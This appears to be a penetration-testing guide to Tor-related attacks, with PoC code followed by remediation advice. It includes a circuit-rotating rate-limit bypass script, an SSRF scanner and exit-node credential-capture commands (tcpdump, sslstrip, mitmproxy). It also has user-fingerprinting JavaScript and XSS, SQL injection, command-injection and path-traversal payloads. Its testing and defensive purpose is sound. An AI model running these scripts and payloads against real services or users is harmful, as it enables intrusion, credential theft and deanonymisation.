# Tor-Based Attacks and Anonymity Testing

## Description
Tor (The Onion Router) is a network designed for anonymous communication. While Tor provides privacy benefits, it also presents unique security challenges for web applications. Attackers can abuse Tor to conduct attacks while remaining anonymous, and applications can be vulnerable to Tor-specific exploitation techniques. This guide covers vulnerabilities related to Tor usage and testing methodologies.

## Understanding Tor in Security Context
Tor routes internet traffic through multiple relay nodes, making it difficult to trace the origin. For security testing:
- **Attackers** use Tor to hide their identity during attacks
- **Applications** may have Tor-specific vulnerabilities
- **Onion services** (.onion sites) have unique attack surfaces
- **Exit nodes** can manipulate unencrypted traffic

## Common Tor-Related Vulnerabilities

### 1. **Tor Exit Node Traffic Manipulation**
Malicious exit nodes can intercept and modify unencrypted traffic.

### 2. **Tor User Deanonymization**
Exploits that can reveal the real IP address of Tor users.

### 3. **Onion Service Enumeration**
Discovering hidden services and their vulnerabilities.

### 4. **Tor Circuit Manipulation**
Attacks targeting Tor's circuit creation and routing.

### 5. **Fingerprinting Tor Users**
Detecting and fingerprinting users accessing via Tor.

### 6. **Rate Limiting Bypass via Tor**
Using Tor to bypass IP-based rate limiting.

### 7. **Hidden Service Authorization Bypass**
Exploiting authentication in Tor hidden services.

### 8. **Timing Attacks on Tor**
Analyzing timing patterns to deanonymize users.

### 9. **Tor Browser Exploitation**
Browser-specific vulnerabilities affecting Tor Browser.

### 10. **Man-in-the-Middle at Exit Nodes**
SSL stripping and traffic interception at exit nodes.

## Testing Methodology & PoC Examples

### PoC 1: Detecting Tor Users

**Vulnerability:** Application doesn't handle Tor users appropriately.

**Detection Methods:**
```python
# Check against Tor exit node list
import requests

def is_tor_exit_node(ip_address):
    # Tor Project provides exit node list
    tor_list_url = "https://check.torproject.org/torbulkexitlist"
    
    try:
        response = requests.get(tor_list_url, timeout=10)
        tor_ips = response.text.split('\n')
        return ip_address in tor_ips
    except:
        return False

# Usage
user_ip = "1.2.3.4"
if is_tor_exit_node(user_ip):
    print("User is connecting via Tor")
```

**HTTP Headers to Check:**
```http
X-Forwarded-For: <tor_exit_node_ip>
Via: 1.1 tor-proxy
```

---

### PoC 2: Rate Limiting Bypass via Tor

**Vulnerability:** IP-based rate limiting can be bypassed using Tor.

**Attack Technique:**
```python
import requests
import time

# Using Tor's SOCKS proxy
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def rotate_tor_circuit():
    # Connect to Tor control port and request new circuit
    from stem import Signal
    from stem.control import Controller
    
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(controller.get_newnym_wait())

# Attack: Bypass rate limiting
for i in range(100):
    try:
        response = requests.post(
            'https://example.com/api/endpoint',
            data={'attack': 'payload'},
            proxies=proxies
        )
        print(f"Request {i}: {response.status_code}")
        
        # Get new Tor circuit every 10 requests
        if i % 10 == 0:
            rotate_tor_circuit()
    except Exception as e:
        print(f"Error: {e}")
```

---

### PoC 3: Onion Service Enumeration

**Vulnerability:** Hidden services can be discovered and mapped.

**Enumeration Tools:**
```bash
# Using OnionScan
onionscan --verbose http://example.onion

# Using ahmia.fi search
curl "https://ahmia.fi/search/?q=keyword"

# Custom enumeration script
python3 onion_scanner.py --target example.onion
```

**Python Onion Scanner:**
```python
import requests
import re

def scan_onion_service(onion_url):
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    
    try:
        # Connect to onion service
        response = requests.get(onion_url, proxies=proxies, timeout=30)
        
        # Extract information
        print(f"Status: {response.status_code}")
        print(f"Server: {response.headers.get('Server', 'Unknown')}")
        
        # Look for other onion links
        onion_links = re.findall(r'[a-z2-7]{16,56}\.onion', response.text)
        print(f"Found {len(onion_links)} onion links")
        
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

# Usage
scan_onion_service('http://example.onion')
```

---

### PoC 4: Exit Node Traffic Interception

**Vulnerability:** Unencrypted traffic through Tor can be intercepted at exit nodes.

**Attack Scenario:**
```bash
# Running a malicious exit node
# Exit node intercepts all HTTP traffic

# Capture credentials from HTTP sites
tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# SSL Strip attack
sslstrip -l 8080

# DNS spoofing at exit node
# Redirect traffic to attacker-controlled servers
```

**Python Exit Node Simulator (Educational):**
```python
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Intercept and log credentials
    if flow.request.method == "POST":
        print(f"POST to: {flow.request.pretty_url}")
        print(f"Data: {flow.request.content}")
        
        # Modify response
        if "password" in str(flow.request.content):
            print("[!] Password captured!")
```

---

### PoC 5: Tor Browser Fingerprinting

**Vulnerability:** Tor Browser users can be fingerprinted despite anonymity.

**Fingerprinting Techniques:**
```javascript
// JavaScript fingerprinting
function fingerprintTorUser() {
    const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        fonts: detectFonts()
    };
    
    // Send to server
    fetch('/track', {
        method: 'POST',
        body: JSON.stringify(fingerprint)
    });
}

function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Fingerprint', 2, 2);
    return canvas.toDataURL();
}
```

**Server-Side Detection:**
```python
def detect_tor_browser(request):
    user_agent = request.headers.get('User-Agent', '')
    
    # Tor Browser has specific UA patterns
    tor_patterns = [
        'Mozilla/5.0 (Windows NT 10.0; rv:',  # Tor Browser on Windows
        'Mozilla/5.0 (X11; Linux x86_64; rv:',  # Tor Browser on Linux
        'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:',  # Tor Browser on macOS
    ]
    
    for pattern in tor_patterns:
        if pattern in user_agent and 'Gecko' in user_agent:
            return True
    
    return False
```

---

### PoC 6: Hidden Service Authentication Bypass

**Vulnerability:** Weak authentication on .onion services.

**Testing Methods:**
```bash
# Test for default credentials
curl --socks5-hostname 127.0.0.1:9050 \
  http://example.onion/admin \
  -u admin:admin

# Test for authentication bypass
curl --socks5-hostname 127.0.0.1:9050 \
  -H "Authorization: Bearer null" \
  http://example.onion/api

# Directory bruteforce on onion service
gobuster dir \
  --proxy socks5://127.0.0.1:9050 \
  -u http://example.onion \
  -w wordlist.txt
```

---

### PoC 7: Timing Analysis for Deanonymization

**Vulnerability:** Traffic timing patterns can reveal user identity.

**Attack Concept:**
```python
import time
import requests

def timing_attack_tor(target_url):
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    
    timings = []
    
    # Collect timing samples
    for i in range(100):
        start = time.time()
        try:
            response = requests.get(target_url, proxies=proxies, timeout=30)
            elapsed = time.time() - start
            timings.append(elapsed)
            print(f"Request {i}: {elapsed:.4f}s")
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(0.1)
    
    # Analyze timing patterns
    import statistics
    print(f"Mean: {statistics.mean(timings):.4f}s")
    print(f"Std Dev: {statistics.stdev(timings):.4f}s")
    
    return timings
```

---

### PoC 8: Onion Service Discovery via SSRF

**Vulnerability:** SSRF can be used to scan internal onion services.

**Payload:**
```http
POST /api/fetch HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "url": "http://internal.onion/admin"
}
```

**Python SSRF Scanner:**
```python
import requests

# Known onion service TLDs
onion_services = [
    'http://3g2upl4pq6kufc4m.onion',  # DuckDuckGo
    'http://thehiddenwiki.onion',
    'http://internal-service.onion'
]

for service in onion_services:
    try:
        # Attempt SSRF
        response = requests.post(
            'https://vulnerable-app.com/api/fetch',
            json={'url': service},
            timeout=60
        )
        
        if response.status_code == 200:
            print(f"[+] Accessible: {service}")
            print(response.text[:200])
    except Exception as e:
        print(f"[-] Failed: {service}")
```

---

### PoC 9: Tor Circuit Hijacking

**Vulnerability:** Malicious relays can manipulate circuits.

**Concept (Theoretical):**
```python
# Controlling both guard and exit nodes
# Attacker runs malicious Tor nodes

def attempt_circuit_correlation():
    # Monitor guard node traffic
    guard_traffic = capture_guard_traffic()
    
    # Monitor exit node traffic
    exit_traffic = capture_exit_traffic()
    
    # Correlate timing and packet sizes
    for guard_packet in guard_traffic:
        for exit_packet in exit_traffic:
            if correlate(guard_packet, exit_packet):
                print("[!] Circuit identified!")
                print(f"User: {guard_packet.source}")
                print(f"Destination: {exit_packet.destination}")
```

---

### PoC 10: Onion Service Vulnerability Scanning

**Vulnerability:** Onion services may have standard web vulnerabilities.

**Scanning with Burp Suite:**
```bash
# Configure Burp to use Tor SOCKS proxy
# Settings -> Network -> SOCKS Proxy
# Host: 127.0.0.1
# Port: 9050

# Then scan onion service normally
```

**Automated Scanning:**
```bash
# Using nikto through Tor
proxychains nikto -h http://example.onion

# Using sqlmap through Tor
sqlmap -u "http://example.onion/page?id=1" \
  --tor --tor-type=SOCKS5 --check-tor

# Using nmap through Tor
proxychains nmap -sT -Pn -p 80,443 example.onion
```

**Python Vulnerability Scanner:**
```python
import requests
from bs4 import BeautifulSoup

def scan_onion_vulns(onion_url):
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    
    tests = {
        'XSS': ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
        'SQLi': ["' OR '1'='1", "admin'--"],
        'Command Injection': ['; ls', '| whoami'],
        'Path Traversal': ['../../etc/passwd', '....//....//etc/passwd']
    }
    
    for vuln_type, payloads in tests.items():
        print(f"Testing {vuln_type}...")
        for payload in payloads:
            try:
                response = requests.get(
                    f"{onion_url}?input={payload}",
                    proxies=proxies,
                    timeout=30
                )
                
                # Basic detection
                if payload in response.text:
                    print(f"[!] Potential {vuln_type} vulnerability")
            except:
                pass
```

---

## Additional Tor-Related Testing Techniques

### 11. **Tor Network Consensus Manipulation**
Testing if application validates Tor consensus data.

### 12. **Hidden Service Descriptor Attacks**
Manipulating hidden service descriptors.

### 13. **Onion Service DoS**
Testing resilience against DoS via Tor.

### 14. **Exit Node Detection Bypass**
Evading Tor exit node blacklists.

### 15. **Tor Bridge Enumeration**
Discovering and testing Tor bridges.

## Tools for Tor-Based Testing

### 1. **Tor Network Tools**
```bash
# Start Tor
tor

# Tor with specific exit node
tor --ExitNodes {CountryCode}

# Check Tor connection
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/

# Get new Tor identity
killall -HUP tor
```

### 2. **Python with Tor**
```python
import requests

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

response = requests.get('https://example.com', proxies=proxies)
```

### 3. **Stem Library (Tor Controller)**
```python
from stem import Signal
from stem.control import Controller

with Controller.from_port(port=9051) as controller:
    controller.authenticate()
    
    # Get new identity
    controller.signal(Signal.NEWNYM)
    
    # Get circuit info
    for circ in controller.get_circuits():
        print(f"Circuit {circ.id}: {circ.path}")
```

### 4. **OnionScan**
```bash
# Scan onion service
onionscan --verbose http://example.onion

# Scan with specific tests
onionscan --mode standard http://example.onion
```

### 5. **Proxychains**
```bash
# Configure proxychains for Tor
# Edit /etc/proxychains.conf
# socks5 127.0.0.1 9050

# Use with any tool
proxychains curl https://example.com
proxychains nmap -sT target.onion
```

## Exploitation Impact

- **Critical:** Complete deanonymization of Tor users
- **High:** Traffic interception, hidden service compromise
- **Medium:** Fingerprinting, rate limit bypass
- **Privacy Impact:** Loss of anonymity, user tracking

## Remediation

### 1. **Detect and Handle Tor Users**
```python
def handle_tor_traffic(request):
    if is_tor_exit_node(request.ip):
        # Apply additional security measures
        require_captcha()
        enforce_stricter_rate_limits()
```

### 2. **Use HTTPS Always**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### 3. **Implement Onion Service Security**
```
# torrc configuration
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceAuthorizeClient stealth client1
```

### 4. **Rate Limiting Beyond IP**
```python
# Use multiple factors for rate limiting
rate_limit_key = f"{user_session}:{user_agent}:{behavior_pattern}"
```

### 5. **Prevent Fingerprinting**
```javascript
// Disable fingerprinting vectors
Object.defineProperty(navigator, 'plugins', { get: () => [] });
```

### 6. **Monitor for Tor Abuse**
```python
# Log and monitor Tor connections
if is_tor_exit_node(ip):
    logger.warning(f"Tor connection from {ip}")
    check_for_abuse_patterns()
```

### 7. **Implement Circuit Padding**
For onion services, use circuit padding to resist timing attacks.

### 8. **Validate Tor Consensus**
Verify Tor network consensus to detect manipulation.

## References

- [Tor Project Official Documentation](https://www.torproject.org/docs/)
- [Tor Exit Node List](https://check.torproject.org/torbulkexitlist)
- [OnionScan Tool](https://github.com/s-rah/onionscan)
- [Tor Browser Design](https://2019.www.torproject.org/projects/torbrowser/design/)
- [Attacks on Tor](https://github.com/Attacks-on-Tor/Attacks-on-Tor)

## Payloads

See `tor-based-payloads.txt` for a comprehensive list of Tor-related attack payloads and testing techniques.
